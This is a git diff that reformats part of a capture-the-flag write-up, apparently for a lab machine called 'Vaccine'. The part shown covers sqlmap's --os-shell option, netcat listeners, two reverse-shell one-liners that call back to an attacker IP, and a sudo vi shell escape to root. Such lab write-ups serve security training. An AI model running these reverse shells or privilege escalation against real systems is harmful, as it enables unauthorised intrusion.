@@ -52,11 +52,12 @@ I tried crack this hash with john and hashcat, however a quick google search cou
 
 With this credential we can connect to port 22 of this server:  
 PS: we could use the sqlmap flag --os-shell to gain a shell and after gain an upgraded reverse shell with the next commands. However i lost the connection sometimes with this method  
-sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e --os-shell  
-Attacker box: nc -nvlp 1234  
-Victim box: RHOST=10.10.16.82; RPORT=1234; TF=$(mktemp -u); mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF &  
-Attacker box: nc -nvlp 4444  
-Victim box: bash -c 'exec bash -i &>/dev/tcp/10.10.16.82/4444 <&1' &  
+- sqlmap -u http://10.10.10.46/dashboard.php?search=elixir --cookie PHPSESSID=qihiab8965c78chkp3u245b13e --os-shell  
+- Attacker box: nc -nvlp 1234  
+- Victim box: RHOST=10.10.16.82; RPORT=1234; TF=$(mktemp -u); mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF &  
+- Attacker box: nc -nvlp 4444  
+- Victim box: bash -c 'exec bash -i &>/dev/tcp/10.10.16.82/4444 <&1' &  
+
 ![alt text](./img/vaccine13.PNG?raw=true)  
 HABEMUS SHELL \o/
 
@@ -64,10 +65,10 @@ HABEMUS SHELL \o/
 ![alt text](./img/vaccine14.PNG?raw=true)  
 
 Look’s like we can run the command “/bin/vi /etc/postgresql/11/main/pg_hba.conf” as sudo, so we can get root:  
-sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf  
-PRESS ESC KEY  
-:set shell=/bin/sh  
-:shell  
+- sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf  
+- PRESS ESC KEY  
+- :set shell=/bin/sh
+- :shell  
 ![alt text](./img/vaccine15.PNG?raw=true)  
 
 ## Discoveries  
